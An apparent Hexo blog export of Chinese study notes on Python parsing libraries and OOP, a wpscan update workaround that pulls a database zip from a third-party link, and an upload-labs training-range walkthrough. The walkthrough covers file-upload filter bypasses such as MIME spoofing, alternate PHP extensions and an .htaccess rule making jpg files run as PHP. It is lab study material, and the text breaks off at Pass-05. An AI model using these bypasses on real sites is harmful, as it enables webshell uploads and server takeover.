1234567891011121314151617181920212223242526272829303132333435363738394041424344# 1.获取class是content-title的元素# class是点. id是#print(doc('h2.content-title')) # 获取果壳网# 2.获取标签的文本内容print(doc('h2.content-title').text())# 3.遍历（先items()）lis = doc('h2.content-title').items()for li in lis: print(li.text())# 4. 获取class为content的div标签下面的ul下面的li# 用空格表示子孙节点lis = doc('div.content ul li').items()#lis = doc('div.content li').items()for i in lis: print(i.text()) # 5. 如果类名不唯一，还可以加上其他的类名一起定位print(doc('div.cont.a.b.c.d'))# 标签里的空格表示`并列`，表示这个div标签有cont,a,b,c,d这五个类名，但在css语法里空格表示`嵌套`，所以我们要添加其他类名的时候`不能输入空格`，而是直接用`小数点`来添加其他类名 # 6. 获取属性 attr("属性名")lis = doc('div.content li').items()for i in lis: print(i.text(),i('a').attr('href')) # 7. 其他的一些选择器lis = doc('div.content ul li')#父节点,包含父节点的所有子孙节点的内容#相当于#print(doc('div.content ul'))print(lis.parent())#祖先节点,就相当于所有源代码了print(lis.parents())#兄弟节点,即同级节点，不包含自己print(lis.siblings) 其他技巧1.伪类选择器 123456#第二个标签lis = doc('div.content li:nth-child(2)').items()for i in lis: print(i.text(),i('a').attr('href')) # 第一个a标签的语法是 a:first-child,最后一个是a:last-child,其它位置的语法如上图所示，第几个括号里就是几（当然第一个你也可以写成 li:nth-child(1)) 类似的 123456#div.content 下面第二个（含）之后的li标签lis = doc('div.content li:gt(1)').items()for i in lis: print(i.text(),i('a').attr('href')) # gt就是greater than,大于的意思，lt (less than)是小于 筛选文本 1234lis = doc('div.content ul').items()for i in lis: #文本包含问号的li标签 print(i("li:contains('？')").text()) 2.修改标签属性 1234567#用remove把特定标签移除，然后再进行遍历lis = doc('div.content ul').remove('.content-article').items()for i in lis: print(i.text()) # 还有如修改属性，增加css之类的一些使用率较低的，用到的时候去官方文档查 ###### 直接在Chrome里调试123456Chrome浏览器自带css的查询方法，按f12或者右键检查，打开Elements面板，按ctrl+f，这里支持xpath，css语法，以及普通的字符查找要注意的是右边的数字，显示的是满足条件的标签数量，可以按向下的箭头过一遍，看看是不是自己想要的信息。 京东的商品栏目 1234567891011121314151617181920import requestsfrom pyquery import PyQuery as pqurl = 'https://www.jd.com/'r = requests.get(url)# 实例化doc = pq(r.text)flag = 1# for i in doc("li.cate_menu_item:nth-child(3) a").items():for i in doc("li.cate_menu_item:gt(1) a").items(): # print(i.text()) print(i.attr('href')) print(i.text()) flag = flag + 1 print("------------")print(flag) 参考文章：https://www.jianshu.com/p/7eb136bbe317 更多用法：https://pythonhosted.org/pyquery/]]></content>
      <categories>
        <category>Python</category>
      </categories>
      <tags>
        <tag>Python</tag>
        <tag>PyQuery</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[python-Beautifulsoup]]></title>
    <url>%2Fpython-Beautifulsoup%2F</url>
    <content type="text"><![CDATA[Beautifulsoup也是用来解析网页数据的 BeautifulSoup对象四种类型: tag NavigableString BeautifulSoap Comment 初始化安装1pip3 install beautifulsoup4 导入1from bs4 import BeautifulSoup 使用12345from bs4 import BeautifulSoupsoup = BeautifulSoup(html_doc, 'html.parser')print(soup.title) 查找基本12soup = BeautifulSoup(open("index.html")) #文件句柄soup = BeautifulSoup("&lt;html&gt;data&lt;/html&gt;") #字符串 find 和 find_all搜索当前 tag 的所有 tag 子节点，并判断是否符合过滤器的条件 语法： 123find(name=None, attrs=&#123;&#125;, recursive=True, text=None, **kwargs) find_all(name=None, attrs=&#123;&#125;, recursive=True, text=None, limit=None, **kwargs) 通过 attrs 参数传递： 123data_soup = BeautifulSoup('&lt;div data-foo="value"&gt;foo!&lt;/div&gt;') print(data_soup.find_all(attrs=&#123;"data-foo": "value"&#125;)) 按 class_ 查找: 1234css_soup = BeautifulSoup('&lt;p class="body bold strikeout"&gt;&lt;/p&gt;') print(css_soup.find_all("p", class_="strikeout")) print(css_soup.find_all("p", class_="body")) 其他搜索方法： 12345678910111213141516171819find_parents() # 返回所有祖先节点find_parent() # 返回直接父节点find_next_siblings() # 返回后面所有的兄弟节点find_next_sibling() # 返回后面的第一个兄弟节点find_previous_siblings() # 返回前面所有的兄弟节点find_previous_sibling() # 返回前面第一个兄弟节点find_all_next() # 返回节点后所有符合条件的节点find_next() # 返回节点后第一个符合条件的节点find_all_previous() # 返回节点前所有符合条件的节点find_previous() # 返回节点前所有符合条件的节点 从文档中找到所有a标签的链接: 12for link in soup.find_all('a'): print(link.get('href')) 从文档中获取所有文字内容: 1print(soup.get_text()) 对象TagTag对象与XML或HTML原生文档中的tag相同 tag中最重要的属性: name和attributes name 1234tag.name# 复赋值tag.name = "xxx" attributes 一个tag可能有很多个属性，一个属性可能有很多个值。 1234567891011121314# 获取tag的指定属性的属性值tag['class']# 获取tag的全部属性及属性值:tag.attrs# tag属性及属性值添加tag['class'] = 'row'# 属性值的删除del tag['class']# 查看属性值print(tag.get('class')) 多值属性tag： 返回类型一般是list,但当某个属性在任何版本的HTML定义中都没有被定义为多值属性时，会将这个属性作为字符串返回 1234567891011css_soup = BeautifulSoup('&lt;p class="body row"&gt;&lt;/p&gt;')css_soup.p['class']# ["body", "row"]css_soup = BeautifulSoup('&lt;p class="body"&gt;&lt;/p&gt;')css_soup.p['class']# ["body"]id_soup = BeautifulSoup('&lt;p id="my id"&gt;&lt;/p&gt;')id_soup.p['id']# 'my id' 如果转换的文档是XML格式,那么tag中不包含多值属性 获取tag某个子节点: soup.tag名， soup.a 获取tag全部子节点: .contents 和 .children 获取tag全部子节点及子孙节点：.descendants 12for child in head_tag.descendants: print(child) 节点内的字符串: 1234567891011# .stringhead_tag.string# .strings 如果tag中包含多个字符串`.strings` 来循环获取head_tag.stringsfor string in soup.strings: print(repr(string)) # .stripped_strings 去除空行空白for string in soup.stripped_strings: print(repr(string)) 父亲节点：.parent 所有父辈节点：.parents 兄弟节点: .prettify(), 其中next_sibling和previous_sibling是前后兄弟 回退和前进： 通过 .next_elements 和 .previous_elements 的迭代器就可以向前或向后访问文档的解析内容,就好像文档正在被解析一样 find_all1234567891011121314151617181920# 过滤strsoup.find_all('b')# 过滤正则for tag in soup.find_all(re.compile("^b")): print(tag.name)# 过滤多个soup.find_all(["a", "b"])# True:可以匹配任何值,下面代码查找到所有的`一级`tagfor tag in soup.find_all(True): print(tag.name)# limit 显示返回数量soup.find_all("a", limit=2)# 只搜索tag的直接子节点,soup.html.find_all("title", recursive=False) 12345def test(tag): #包含 class 属性却不包含 id 属性 return tag.has_attr('class') and not tag.has_attr('id')# 调用soup.find_all(test) 1234#下面两行代码是等价的soup.find_all('div', limit=1)soup.find('div') 区别:find_all() 方法的返回结果是值包含一个元素的列表,而 find() 方法直接返回结果.find_all() 方法没有找到目标是返回空列表, find() 方法找不到目标时,返回 None NavigableString可遍历字符串 通过 unicode() 方法可以直接将 NavigableString 对象转换成Unicode字符串: 1unicode_string = unicode(tag.string) BeautifulSoup表示的是一个文档的全部内容,可以把它当作 Tag 对象，是一个特殊的 Tag，我们可以分别获取它的类型，名称，以及属性。 Comment12345678910111213html_doc='&lt;a href="http://z.com" class="row" id="box"&gt;&lt;!-- hhh --&gt;&lt;/a&gt;'soup = BeautifulSoup(html_doc, 'html.parser')print(soup.a.string) # hhhprint(type(soup.a.string)) # &lt;class 'bs4.element.Comment'&gt;"""a 标签里的内容实际上是注释，但是如果我们利用 .string 来输出它的内容，我们发现它已经把注释符号去掉了，所以这可能会给我们带来不必要的麻烦。"""# 在使用前最好做一下判断if type(soup.a.string)==bs4.element.Comment: print soup.a.string]]></content>
      <categories>
        <category>Python</category>
      </categories>
      <tags>
        <tag>Python</tag>
        <tag>Beautifulsoup</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[python-XPath]]></title>
    <url>%2Fpython-XPath%2F</url>
    <content type="text"><![CDATA[XPathXPath，全称 XML Path Language，即 XML 路径语言，它是一门在 XML 文档中查找信息的语言。最初是用来搜寻 XML 文档的，但同样适用于 HTML 文档的搜索。所以在做爬虫时完全可以使用 XPath 做相应的信息抽取。 python库lxml的安装1pip3 install lxml XPath常用规则 表达式 描述 nodename 选取此节点的所有子节点 / 从当前节点选取直接子节点 // 从当前节点选取子孙节点 . 选取当前节点 .. 选取当前节点的父节点 @ 选取属性 * 通配符，选择所有元素节点与元素名 @* 选取所有属性 [@attrib] 选取具有给定属性的所有元素 [@attrib=’value’] 选取给定属性具有给定值的所有元素 [tag] 选取所有具有指定元素的直接子节点 [tag=’text’] 选取所有具有指定元素并且文本内容是text节点 XPath中的运算符 运算符 描述 实例 返回值 or 或 age=19 or age=20 如果age等于19或者等于20则返回true反正返回false and 与 age&gt;19 and age&lt;21 如果age等于20则返回true，否则返回false mod 取余 5 mod 2 1 \ 取两个节点的集合 //book \ //cd 返回所有拥有book和cd元素的节点集合 + 加 6+4 10 - 减 6-4 2 * 乘 6*4 24 div 除法 8 div 4 2 = 等于 age=19 true != 不等于 age!=19 true &lt; 小于 age&lt;19 true &lt;= 小于或等于 age&lt;=19 true &gt; 大于 age&gt;19 true &gt;= 大于或等于 age&gt;=19 true 解析方式123456789101112131415161718192021from lxml import etreetext='''&lt;div&gt; &lt;ul&gt; &lt;li class="item-0"&gt;&lt;a href="link1.html"&gt;第一个&lt;/a&gt;&lt;/li&gt; &lt;li class="item-1"&gt;&lt;a href="link2.html"&gt;second item&lt;/a&gt;&lt;/li&gt; &lt;li class="item-0"&gt;&lt;a href="link5.html"&gt;a属性&lt;/a&gt; &lt;/ul&gt; &lt;/div&gt;'''# 1.读取文本解析节点html=etree.HTML(text) #初始化生成一个XPath解析对象result=etree.tostring(html,encoding='utf-8') #解析对象输出代码# 2.读取HTML文件进行解析html=etree.parse('test.html',etree.HTMLParser()) #指定解析器HTMLParser会根据文件修复HTML文件中缺失的如声明信息result=etree.tostring(html) #解析成字节#result=etree.tostringlist(html) #解析成列表 获取元素节点123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596# 1.获取所有节点 //from lxml import etreehtml=etree.parse('test.html',etree.HTMLParser())result=html.xpath('//*') #//代表获取子孙节点，*代表获取所有# 如要获取li节点，可以使用//后面加上节点名称，然后调用xpath()方法html.xpath('//li') #获取所有子孙节点的li节点# 2.获取子节点 /result=html.xpath('//li/a') #通过追加/a选择所有li节点的所有直接a节点，因为//li用于选中所有li节点，/a用于选中li节点的`所有直接子节点a`# 3.获取父节点 .. parent::# 使用`..`来实现也可以使用`parent::`来获取父节点html=etree.HTML(text, etree.HTMLParser())result=html.xpath('//a[@href="link2.html"]/../@class')result1=html.xpath('//a[@href="link2.html"]/parent::*/@class' # 4.根据属性匹配节点 //div[@class='box']html=etree.HTML(text, etree.HTMLParser())result=html.xpath('//li[@class="item-1"]')print(result) # 5.获取节点中的文本 text()html=etree.HTML(text,etree.HTMLParser())result=html.xpath('//li[@class="item-1"]/a/text()') #获取a节点下的内容result1=html.xpath('//li[@class="item-1"]//text()') #获取li下所有子孙节点的内容 # 6. 获取属性 @href, @class, @srcresult=html.xpath('//li/a/@href') #获取a的href属性result=html.xpath('//li//@href') #获取所有li子孙节点的href属性 # 7. 属性多值匹配节点(某个属性的值有多个时，一个节点有多个属性值) contains()text1='''&lt;div&gt; &lt;ul&gt; &lt;li class="aaa item-0"&gt;&lt;a href="link1.html"&gt;第一个&lt;/a&gt;&lt;/li&gt; &lt;li class="bbb item-1"&gt;&lt;a href="link2.html"&gt;second item&lt;/a&gt;&lt;/li&gt; &lt;/ul&gt; &lt;/div&gt;'''html=etree.HTML(text1,etree.HTMLParser())result1=html.xpath('//li[contains(@class,"aaa")]/a/text()') # 8.多属性匹配（根据多个属性确定一个节点， 多个节点有相同的属性值） andtext1='''&lt;div&gt; &lt;ul&gt; &lt;li class="aaa" name="item"&gt;&lt;a href="link1.html"&gt;第一个&lt;/a&gt;&lt;/li&gt; &lt;li class="aaa" name="fore"&gt;&lt;a href="link2.html"&gt;second item&lt;/a&gt;&lt;/li&gt; &lt;/ul&gt; &lt;/div&gt;'''html=etree.HTML(text1,etree.HTMLParser())result=html.xpath('//li[@class="aaa" and @name="fore"]/a/text()')result1=html.xpath('//li[contains(@class,"aaa") and @name="fore"]/a/text()') # 9. 按序选择# 可能同时匹配多个节点，但我们只想要其中的某个节点，如第二个节点或者最后一个节点，这时可以利用中括号引入索引的方法获取特定次序的节点： [1], [last()], position()result=html.xpath('//li[contains(@class,"aaa")]/a/text()') #获取所有li节点下a节点的内容result1=html.xpath('//li[1][contains(@class,"aaa")]/a/text()') #获取第一个result2=html.xpath('//li[last()][contains(@class,"aaa")]/a/text()') #获取最后一个result3=html.xpath('//li[position()&gt;2 and position()&lt;4][contains(@class,"aaa")]/a/text()') #获取第三个result4=html.xpath('//li[last()-2][contains(@class,"aaa")]/a/text()') #获取倒数第三个# XPath的函数： http://www.w3school.com.cn/xpath/xpath_functions.asp # 10. 节点轴选择# 包括获取子元素、兄弟元素、父元素、祖先元素等 result=html.xpath('//li[1]/ancestor::*') #获取所有祖先节点result1=html.xpath('//li[1]/ancestor::div') #获取div祖先节点result2=html.xpath('//li[1]/attribute::*') #获取所有属性值result3=html.xpath('//li[1]/child::*') #获取所有直接子节点result4=html.xpath('//li[1]/descendant::a') #获取所有子孙节点的a节点result5=html.xpath('//li[1]/following::*') #获取当前子节之后的所有节点result6=html.xpath('//li[1]/following-sibling::*') #获取当前节点的所有同级节点 # 更多轴的用法可参考：http://www.w3school.com.cn/xpath/xpath_axes.asp 本文参考：https://www.cnblogs.com/zhangxinqi/p/9210211.html 博主写的很详细，也很美观 XPath的更多用法参考：http://www.w3school.com.cn/xpath/index.asp python lxml库的更多用法参考：http://lxml.de/]]></content>
      <categories>
        <category>Python</category>
      </categories>
      <tags>
        <tag>Python</tag>
        <tag>XPath</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[python基础-装饰器]]></title>
    <url>%2Fpython%E5%9F%BA%E7%A1%80-%E8%A3%85%E9%A5%B0%E5%99%A8%2F</url>
    <content type="text"><![CDATA[装饰器12345678910111213141516171819202122232425262728293031323334353637383940###函数的装饰器,本质上就是一个闭包## 概括的讲，装饰器的作用就是为已经存在的对象添加额外的功能。def f1(func): print('f1 runing') def f2(y): print('f2 running') return func(y) +1 return f2@f1 #装饰器 (@符号加函数名,装饰上了gun函数) #相当于f1(gun)def gun(m): print('gun runing') return m*m## @f1 -&gt; f1( gun) -&gt; f2n=gun(5) # gun(5) -&gt; 就是在运行 f2(5)print(n)#############例子:import timedef run_time(func): def new_fun(*args,**kwargs): t0 = time.time() print('star time: %s'%(time.strftime('%X',time.localtime())) ) back = func(*args,**kwargs) print('end time: %s'%(time.strftime('%X',time.localtime())) ) print('run time: %s'%(time.time() - t0)) return back return new_fun@run_timedef test2(n): for i in range(1,n): for j in range(1,i+1): print('%dx%d=%2s'%(j,i,i*j),end = ' ') print ()#@run_time -&gt; run_time(test2) -&gt; new_funn = test2(10) #就相当于运行new_time(5) 例子1234567891011121314151617181920# 写一个login函数 然后写一个装饰器，模拟登录过程：让程序延迟3秒 在延迟过程中输出正在验证"""def login(): print('登录成功')"""import timedef login_required(func): def wrpper(*args,**kwargs): print('正在验证...') time.sleep(5) return func(*args,**kwargs) return wrpper@login_requireddef login(): print('登录成功') #return 'code:200'login() 类作为装饰器1234567891011121314151617181920## 用__call__方法class Tset_Class(): def __init__(self,func): # 传进来函数 print('正在实例化') self.func = func def __call__(self, *args, **kwargs): #类装饰器, 一定要写__call__方法 print('这是call方法') return self.func@Tset_Classdef test(): print('这是一个测试函数')n = test() # self.func : test 函数体n() # n() 调用test（）# 1. @Tset_Class ： Tset_Class( test ) -&gt; 相当于：t = Tset_Class( test )# 2. test() -&gt; 相当于： 调用实例的call方法 -&gt; 返回 self.func函数体# 3. n = test() ，n() 调用test（） 类中常见的几种装饰器123456789101112131415161718192021222324252627282930313233343536373839404142434445464748class Test(): aa = 123 def __init__(self,name): self.__name = name @property # 把方法变成属性 def get_name(self): print( self.__name) return self.__name @get_name.setter # 可以让get方法，变成set方法 def get_name(self,name): self.__name = name @property # 把方法变成属性 def po(self): print('asdfasdfasdfasdaf') @staticmethod def test(): print('staticmethod func') @classmethod def show(cls): print(cls.aa) # 可以访问类属性 print('classmethod func ')t = Test('jianeng')t.show()# @property# t.get_name = 4 # get_name.setter 没有写的时候， = 4 会报错# t.get_name# t.po# @staticmethod #没有selft.test() # 没有self ，实例不能调用。Test.test() # 类名可以直接调用### @classmethod #类方法, 一般是用来做封装 class名字已经传进去了Test.show() #有self， 类名不能直接调用t.show()##静态方法装饰器： staticmethod 类调用与实例调用无差别， 也不需要self参数，类似于普通函数 不需实例化就可以调用,直接用类名调用 （与实例解绑）， 不能访问其他的类属性与方法（相当于类的方法）##类方法装饰器： classmethod self参数被换成cls参数， 自动传入对应的类 可以访问类属性与其他类方法]]></content>
      <categories>
        <category>Python</category>
      </categories>
      <tags>
        <tag>Python</tag>
        <tag>装饰器</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[python基础-闭包]]></title>
    <url>%2Fpython%E5%9F%BA%E7%A1%80-%E9%97%AD%E5%8C%85%2F</url>
    <content type="text"><![CDATA[12345678910111213141516171819202122232425262728293031# 闭包: 一个函数里面嵌套一个函数,调用外层函数返回里层函数本身#1.def fx(x): x+=1 def fy(y): return x*y return fy #不要加括号f=fx(5) #拿到fy的函数体n = f(5) #fy()print(n)#2.传进去的参数为函数体def f1(func): print('f1 runing') def f2(y): print('f2 running') return func(y) +1 return f2def gun(m): print('gun runing') return m*mtemp = f1(gun) # 返回f2函数体 # f1 runing -&gt; f2 -&gt;tempn= temp( 5) # f2( 5) -&gt; ' f2 running ' -&gt; return func(y) +1 # func(y) === gun(m) -&gt; gun runing -&gt; 5*5 # return 25 +1 -&gt; 26print(n)]]></content>
      <categories>
        <category>Python</category>
      </categories>
      <tags>
        <tag>Python</tag>
        <tag>闭包</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[python面向对象-继承小小例子]]></title>
    <url>%2Fpython%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1-%E7%BB%A7%E6%89%BF%E5%B0%8F%E5%B0%8F%E4%BE%8B%E5%AD%90%2F</url>
    <content type="text"><![CDATA[用之前学习笔记的小例子来复习一下 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788899091############################继承#父类里面有的,子类里面再写一次. 叫做重写 ,只会用子类的了,父类的就屏蔽了#继承是通过查找来找的, 不是变量空间的复制, 还是独立的变量空间# 多继承 既不是广度也不是深度搜索 . mro() 方法,是在类里面的,他会自己计算出搜索顺序 例如: print(Magician.mro())或print(Magician.__mro__) 或者 print(s.__class__.mro())# [&lt;class '__main__.Magician'&gt;, &lt;class '__main__.Role'&gt;, &lt;class 'object'&gt;]# super 自己找父类, 如果父类改变,也不需要修改,哪怕父类被更换，也不用担心了！ super不需要再传self ,super是通过mro查找的#__bases__特殊属性 print(Role.__bases__) 打印出来是一个元组 (&lt;class 'object'&gt;,)#实例+() 自动调用__call__方法class Role: def __init__(self,name,level,blood): # 在实例化之后自动被调用,用来进行初始化 self.name = name self.level = level self.blood = blood def __repr__(self): return "&#123;cls&#125;:&#123;name&#125;,&#123;level&#125;,&#123;blood&#125;".format(cls=self.__class__.__name__, name=self.name, level=self.level, blood=self.blood ) def figth(self): raise NotImplementedError('必须在子类中实现该行为')class SwordsMan(Role): #继承了Role类 def __init__(self,name,level,blood,attack_power): #重写了__init__ #Role.__init__(self,name,level,blood) super().__init__(name, level, blood) #不在明确指定类名 self.attack_power = attack_power def fight(self): print('物理攻击')class Magician(Role): #继承自Role def __init__(self,name,level,blood,magical_power): #重写了__init__ #Role.__init__(self,name,level,blood) super().__init__(name, level, blood) # 不在明确指定类名 self.magical_power = magical_power def fight(self): print('魔法攻击') def cure(self): print('治疗')## 鸭子类型#展示出攻击的效果(这件事,不属于任何一个角色)#写出一个函数def draw_fight(role): # 鸭子类型体现出来是,一个函数,所关心的不是类型,而是行为 print('role', end='') role.fight() # 其实并不关心,role是不是一个role实例class GirlFriend: #虽然没有继承Role类,依然可以用鸭子类型 def __init__(self,name): self.name = name def fight(self): print('拔电源攻击')g = GirlFriend('xxx')draw_fight(g) #打印出role拔电源攻击s= SwordsMan('xps',18,3000,150) #实例化m = Magician('ps',18,1400,6660)draw_fight(s) #打印出 role物理攻击draw_fight(m) #打印出 role魔法攻击print(s)print(m.__repr__())print('***********************************************************')# 继承是通过查找来找的, 不是变量空间的复制, 而是独立的变量空间class BaseClass: attribute = 1 def method(self): passclass DerivedClass: # 简单继承,没有任何的封装与重写 passprint(DerivedClass.__dict__) # DerivedClass中没有 attribute 与 methodprint(BaseClass.__dict__) # BaseClass中有print(Magician.__mro__)print(s.__class__.mro())]]></content>
      <categories>
        <category>Python</category>
      </categories>
      <tags>
        <tag>Python</tag>
        <tag>继承</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[python面向对象小例子]]></title>
    <url>%2Fpython%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1%E5%B0%8F%E4%BE%8B%E5%AD%90%2F</url>
    <content type="text"><![CDATA[用一个银行存款取款的例子来回忆一下面向对象最基础的部分 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138class Account: all_count=&#123;&#125; #类属性 def __init__(self, name, number, balance): # 初始化账户的'实例方法',见名知意 self.name = name self.number = number # 实例的变量属性 self.balance = balance self.all_count[self.number] = self # # def __del__(self): #当实例对象被销毁的时候,当变量的指向为0的时候 自动触发 # print(self.name,'被销毁了') def deposit(self, amount): # 存款 if amount &lt;= 0: print('存款金额不得为负') else: self.balance += amount def withdraw(self, amount): # 取款 if amount &gt; self.balance: print('余额不足') else: self.balance -= amount def describe(self): # 查询账户详情 return "Account(姓名:&#123;name&#125;,账户:&#123;number&#125;,余额:&#123;balance&#125;)".format(name=self.name, number=self.number, balance=self.balance) def close(self): self.all_count.pop(self.number)a=Account('xps','6217',10000)v = getattr(a,'nme','000')# b = a# del aprint(v)# a.deposit(5000)# a.withdraw(2500)# print(a.describe())## print(a.__dict__)# print(__name__)############################################ 笔记 #######################################3#__init__() 在实例化之后自动被调用,用来进行初始化#__del__() 删除变量的指向,不是直接去删除这个对象 例如:a=[1,2,3] b=a del a a变量没了,但是b还存在 #程序执行完之后变量的内存自动释放.自动触发 __del__#__str__() #str 会自动触发 对用户友好 后面可以直接 print(a) 来输出str的值,如果没有定义a,则输出repr的值#__repr__() repr会自动触发 对开发者友好 在控制台shell 直接 a 输出repr的值 ,如果repr没有定义,则不会找str#getattr() getattr(i,'name','没有') 相当于转换成对象的访问 obj.name 获取,,和字典里面的get()方法类似,找不到返回'没有' 'name'这里是一个字符串#hasattr() hasattr(i,'xxx') 返回布尔值 (还可以避免因为属性没有而产生报错) 'xxx'也是字符串 hasattr 还可以避免，因为属性没有，而导致的报错#setattr() setattr(i,'name','vvv'') 自动转换成i.name = 'vvv' 'name'这里是一个字符串#delattr() delattr(i,'name') 删除 'name'这里是一个字符串 转化成del i.name#__class__ 可以得到一个类实例所属的类对象,print(a.__class__) &lt;class '__main__.Account'&gt; 不是类名#__doc__ 注释文档写了之后,可以help出来 如:print(help(Account)) # 注释存储在了__doc__里 如: print(Account.__doc__)可以打印其文档注释#__dict__ 一个存储了对象属性的字典 把该变量空间的打印出来 # 例:print(a.__dict__) &gt;&gt;&#123;'balance': 12500, 'name': 'xps', 'number': '6217'&#125; #类也可以 print(Account.__dict__)#__name__def dance(): passprint(dance.__name__) #可以查看该函数的名字class C: passprint(C.__name__) #可以查看该类的名字#类名 是一个字符串#print 输出的是你给他的东西得 __str__#shell 里面 输出的是 你给他的东西的 __repr__#self 是实例本身# print 输出的str 但是如果输出一个数据结构(集合元组字典列表)的数据,里面的数据,会以repr展示########################################################################################if __name__ == '__main__': pass#print(str(__name__)) __name__#import 的时候,会把那个文件执行一遍###如果作为一个模块被导入的话,就不会调用__name__以下的东西# print(__name__) 结果为 __main__#######################################################闭包###########################33class A: def __del__(self): print('被销毁0')def outer(): # a=A() #a 是在函数调用时候实例化的 def inner(): #inner 也是在outer里面定义的,在outer结束的时候inner也被销毁 print(a) return innerx = outer() #用一个变量去接受,就不会打印出来,inner获得一个临时指向del x #销毁函数inner#1.构造局部的全局变量#2.在没有类的情况下,封装变量input()######私有化,保护作用,类的外面访问不到_eye=2 # protect 隐藏 但是可print(dog._eye)访问.修改__leg=4 # 彻底保护. 万一访问的话,可以以下在外面访问(先定义一个方法):def getLeg(self): #获取私有属性 return self.__legleg = dog.getLeg()print(leg) #可通过此方法在类外面查看###如果是修改私有属性的话:def setLeg(self,leg): #设置 self.__leg = legdog.setLeg(55) #修改私有属性print(dog.getLeg()) #用get 方法来查看一下]]></content>
      <categories>
        <category>Python</category>
      </categories>
      <tags>
        <tag>Python</tag>
        <tag>面向对象</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[wpscan更新超时报错]]></title>
    <url>%2Fwpscan%E6%9B%B4%E6%96%B0%E8%B6%85%E6%97%B6%E6%8A%A5%E9%94%99%2F</url>
    <content type="text"><![CDATA[自：https://blog.csdn.net/zhang644720213/article/details/92849717 参考自：https://blog.csdn.net/zhang644720213/article/details/92849717 先更新一下系统的索引updatedb 查看文件dpkg -L wpscan 下载需要的包（感谢大佬提供）:wget https://files.cnblogs.com/files/despotic/wp.zip 放到本地apache的目录下：mv wp.zip /var/www/html/wpscan/ 解压：unzip wp.zip 重启apache/etc/init.d/apache2 restart 编辑配置文件：vim /var/lib/gems/2.5.0/gems/wpscan-3.5.4/lib/wpscan/db/updater.rb 找到：def remote_file_url这个函数， 下面的服务器地址改为本地的目录http://127.0.0.1/wpsaca/#{filename} 再运行wpscan --upgrade就可以了]]></content>
      <categories>
        <category>渗透测试</category>
      </categories>
      <tags>
        <tag>渗透测试</tag>
        <tag>WPscan</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[upload-labs通关记录]]></title>
    <url>%2Fupload-labs%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95%2F</url>
    <content type="text"><![CDATA[本文主要记录一下upload-labs最新21关卡的过程，作为自己的一个笔记。 靶场地址：https://github.com/c0ny1/upload-labs/ ps： - 为了快速验证效果，此处上传的webshell代码为&lt;php? phpinfo(); ?&gt; - 解题思路五花八门，我这里想起了啥就用啥。 - 因为比较菜，所以做题直接看代码了就(谁料有的题目看了代码都看不懂)，哈哈哈。 相关函数123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051trim() 去除空格strrchr()查找字符串在另一个字符串中`最后一次`出现的位置，并返回从该位置到字符串结尾的所有字符。strrchr(&quot;被查找的字符串&quot;, &quot;出现的字符串&quot;)strstr() - 查找字符串的首次出现strrpos() - 计算指定字符串在目标字符串中最后一次出现的位置str_ireplace(&apos;要替换的对象&apos;,&apos;替换为&apos;,&apos;字符串&apos;)deldot($file_name);//删除文件名末尾的点::$DATA ---&gt; win上，会把`::$DATA`之后的数据当成文件流处理，不会检测后缀名，而且保持`::$DATA`之前的文件名（目的是不检查后缀名）pathinfo(path,options)返回一个关联数组包含有 path 的信息。包括以下的数组元素：[dirname][basename][extension]第二个参数可能的值：PATHINFO_DIRNAME - 只返回 dirnamePATHINFO_BASENAME - 只返回 basenamePATHINFO_EXTENSION - 只返回 extension注释：如果不是要求取得所有单元，则 pathinfo() 函数返回字符串。intval() 函数用于获取变量的整数值。@uppack`rename()` 函数 ：重命名文件或目录。如果成功，该函数返回 TRUE。如果失败，则返回 FALSE。rename(oldname,newname,context) Pass-01 js验证 点击上传文件之后，burp没有拦截到数据包，并且验证反应速度快 F12查看代码后确认 绕过F1: 禁用js，直接上传php 成功： F2： 在本地创建html，action为服务器请求地址，（去掉相应js部分） F3: 先把shell改为允许的类型,再bup中再改回来 效果都是一样的 Pass-02 服务端验证 – 文件MIME类型 只检测文件自带的类型 绕过：burp修改数据包中修改MIME类型（Content-Type）为允许的类型 Pass03-Pass10: 黑名单校验Pass-03 服务端验证(黑名单方式) – 多种格式后缀解析 对上传的文件先过滤，后判断文件后缀，再随机命名 比如： a.php 先删掉文件名前后的空格 删除末尾的点： a.php strrchr之后： .php 转换为小写： .php 去除字符串::$DATA 再收尾去空格 最后加上日期重命名 绕过 前提: httpd-conf文件中AddType application/x-httpd-php 没有被注释，而且有规定类型的文件 对 phtml，php3，php4，php5，pht，htaccess没有进行过滤，那么利用这两种方法进行绕过。 补充: asp: asa, cer, cdx 等 jsp: jspx, jspf aspx: ashx,asmx,ascx 准备工作： 修改httpd-conf配置文件,这里可以把php3等想要的文件后缀加上，再把注释符#去掉 此类的正则表达式，文件名字满足即可在apache当做php解析。比如以下格式的文件： php3，php4, php5, phtml，phps 修改为： AddType application/x-httpd-php .php .phtml .php3 .php4 .php5 .phps F1: 修改后缀名 burp拦截数据包，修改filename为php3,上传成功 右键图片查看地址, 从这里可以得知上传的文件被重命名了, 打开图片地址，OK F2: 上传图片马 上传图片马，然后利用BP拦截，将后缀名 改为phtml,php3,php4,php5,pht ​ ​ Pass-04 服务端（php5之类的也进行了过滤） 但是没有过滤.htaccess，可以考虑重写文件解析规则绕过 info.php.jpg. 绕过 前提: apache搭建， 没有对上传文件重命名 .htaccess文件 1.先上传一个.htaccess文件，内容如下： 12345&lt;FilesMatch "jpg"&gt;SetHandler application/x-httpd-php&lt;/FilesMatch&gt; 2.然后再上传一个info.php, burp拦截数据包修改filename为info.jpg / 或者直接上图片马， url访问图片路径，正常解析 Pass-05 连.htaccess都放黑名单了 缺陷： strrchr函数： 